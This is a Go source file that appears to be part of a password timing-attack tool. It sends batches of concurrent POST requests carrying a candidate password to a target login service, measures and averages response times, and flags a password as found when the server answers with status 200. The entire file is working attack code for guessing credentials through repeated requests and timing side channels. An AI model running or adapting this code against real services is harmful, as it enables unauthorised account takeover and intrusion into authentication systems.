package main

import (
	"bytes"
	"context"
	"encoding/json"
	"log"
	"net/http"
	"sync"
	"time"
)

type Attempt struct {
	pwd       string
	triesNum  int
	ctx       context.Context
	cancelFn  context.CancelFunc
	wg        *sync.WaitGroup
	durChan   chan time.Duration
	resChan   chan result
	durations []time.Duration
}

func NewAttempt(parentCtx context.Context, pwd string, triesNo int, resChan chan result) *Attempt {
	if triesNo <= 0 {
		return nil
	}

	ctx, cancelFn := context.WithCancel(parentCtx)
	defer cancelFn()
	att := &Attempt{
		pwd:       pwd,
		triesNum:  triesNo,
		ctx:       ctx,
		cancelFn:  cancelFn,
		durChan:   make(chan time.Duration),
		resChan:   resChan,
		durations: make([]time.Duration, 0),
	}

	att.wg = &sync.WaitGroup{}
	att.wg.Add(triesNo + 1)

	go att.durationAcumulator()

	for i := 0; i < triesNo; i++ {
		go att.makePostReq()
	}

	att.wg.Wait()
	// log.Printf("Finished all tried for Attempt with pwd: %s", att.pwd)

	return att
}

func (a *Attempt) durationAcumulator() {
	// log.Printf("attempt: %+v", *a)
	defer a.wg.Done()

	for {
		select {
		case d := <-a.durChan:
			a.durations = append(a.durations, d)
			//log.Printf("Password: %s; Added duration: %d; Total durations: %d", a.pwd, d, len(a.durations))
			if a.triesNum == len(a.durations) {
				r := result{
					pwd:        a.pwd,
					duration:   a.GetDuration(),
					statusCode: 401,
				}
				log.Printf("All tries done %+v", r)
				a.resChan <- r
				return
			}
		case <-a.ctx.Done():
			log.Printf("Canceling durationAccumulator for pwd %s", a.pwd)
			return
		}
	}
}

func (a *Attempt) makePostReq() {
	defer a.wg.Done()

	start := time.Now()

	values := map[string]string{"pwd": a.pwd}
	jsonData, err := json.Marshal(values)
	if err != nil {
		log.Fatalf("Failed to marshal json. %+v; Error: %s", jsonData, err.Error())
	}
	// log.Printf("Sending POST for password %s", a.pwd)

	req, err := http.NewRequest("POST", targetServiceUrl, bytes.NewBuffer(jsonData))
	if err != nil {
		log.Fatalf("Failed to create POST request. Error: %s", err.Error())
	}
	req.Header.Set("Content-Type", "application/json; charset=utf-8")

	client := http.Client{}
	client.Timeout = time.Second * 10
	resp, err := client.Do(req.WithContext(a.ctx))
	if err != nil {
		log.Fatalf("Failed to POST data. Error: %s", err.Error())
	}

	if resp.StatusCode == 200 {
		// log.Printf("--->>> SUCCESS FOUND password: %s", a.pwd)
		a.resChan <- result{
			pwd:        a.pwd,
			duration:   a.GetDuration(),
			statusCode: resp.StatusCode,
		}
	}
	// else {
	// 	log.Printf("Try: Password: %s, Code %d", a.pwd, resp.StatusCode)
	// }

	a.durChan <- time.Since(start)
	// log.Printf("Leaving POST for password: %s", a.pwd)
}

func (a *Attempt) GetDuration() time.Duration {
	return Avg(a.durations)
}
